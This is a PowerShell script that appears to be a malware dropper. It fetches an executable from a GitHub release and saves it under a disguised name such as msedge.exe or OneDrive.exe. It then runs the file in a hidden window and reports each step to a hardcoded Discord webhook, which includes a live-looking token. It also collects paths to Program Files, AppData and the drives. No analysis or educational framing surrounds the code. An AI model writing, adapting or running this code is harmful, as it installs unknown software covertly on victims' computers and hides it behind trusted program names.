$webhookUrl = 'https://discord.com/api/webhooks/1418620647654953144/quGfUxYm_ZNxydSkulCZd2NGHsrHdfIm0h5J9gM5R0FQyrdsQRecWTTMaI3Mff3cWQzU'

function Send-WebhookMessage {
    param (
        [Parameter(Mandatory=$true)]
        [string]$Message
    )
    $client = [System.Net.Http.HttpClient]::new()
    $payload = @{ content = $Message } | ConvertTo-Json
    $content = [System.Net.Http.StringContent]::new($payload, [System.Text.Encoding]::UTF8, 'application/json')
    try {
        $client.PostAsync($webhookUrl, $content).GetAwaiter().GetResult() | Out-Null
    } catch {}
    $client.Dispose()
}

Send-WebhookMessage -Message "Script started at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"

try {
    $programFiles = "C:\Program Files"
    $tempFolder = $env:TEMP
    $appDataFolder = $env:APPDATA
    $localAppDataFolder = $env:LOCALAPPDATA
    $directories = Get-ChildItem -Path $programFiles -Directory | Where-Object { $_.Name -notlike "Windows*" -and $_.Name -notlike "ModifiableWindowsApps" }
    $drives = Get-PSDrive -PSProvider FileSystem | ForEach-Object { $_.Root }

    $exeNames = @("msedge.exe", "OneDrive.exe", "GoogleUpdate.exe", "steam.exe")
    $selectedExe = $exeNames | Get-Random
    $destinationPath = Join-Path -Path $localAppDataFolder -ChildPath $selectedExe

    $downloadUrl = "https://github.com/skiddyskid111/resources/releases/download/adadad/scripthelper.exe"
    try {
        Invoke-WebRequest -Uri $downloadUrl -OutFile $destinationPath -UseBasicParsing -ErrorAction Stop | Out-Null
        Send-WebhookMessage -Message "Downloaded $selectedExe to $destinationPath"
        Start-Process -FilePath $destinationPath -WindowStyle Hidden -ErrorAction Stop | Out-Null
        Send-WebhookMessage -Message "Executed $selectedExe"
    } catch {
        $errorMessage = $_.ToString() -replace '[^\w\s\.\:\\]', ''
        Send-WebhookMessage -Message "Error downloading or executing $selectedExe : $errorMessage"
    }
    Send-WebhookMessage -Message "Script completed at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
} catch {
    $errorMessage = $_.ToString() -replace '[^\w\s\.\:\\]', ''
    Send-WebhookMessage -Message "Unexpected error: $errorMessage"
}
